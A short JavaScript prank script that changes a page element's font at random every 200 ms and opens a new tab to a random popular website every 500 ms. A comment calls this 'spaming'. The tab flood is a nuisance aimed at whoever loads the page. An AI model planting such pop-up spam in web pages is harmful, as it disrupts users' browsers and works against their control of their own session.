// sites
const sites = [
    'https://www.youtube.com',
    'https://www.google.com',
    'https://www.github.com',
    'https://www.reddit.com',
    'https://www.twitter.com',
    'https://www.twitch.tv',
    'https://www.discord.com',
    'https://www.spotify.com',
    'https://www.netflix.com',
    'https://www.amazon.com'
];

// fonts
const fonts = [
    'Arial, sans-serif',
    'Verdana, sans-serif',
    'Times New Roman, serif',
    'Courier New, monospace',
    'Georgia, serif',
    'Comic Sans MS, cursive',
    'Impact, sans-serif',
    'Trebuchet MS, sans-serif'
];

function changeFont() {
    const textElement = document.getElementById('text');
    if (textElement) {
        const randomFont = fonts[Math.floor(Math.random() * fonts.length)];
        textElement.style.fontFamily = randomFont;
    }
}

// change font
setInterval(changeFont, 200);

// open rand site
function openRandomSite() {
    const randomSite = sites[Math.floor(Math.random() * sites.length)];
    window.open(randomSite, '_blank');
}

//open first site
setTimeout(openRandomSite, 500);

// spaming
setInterval(openRandomSite, 500);
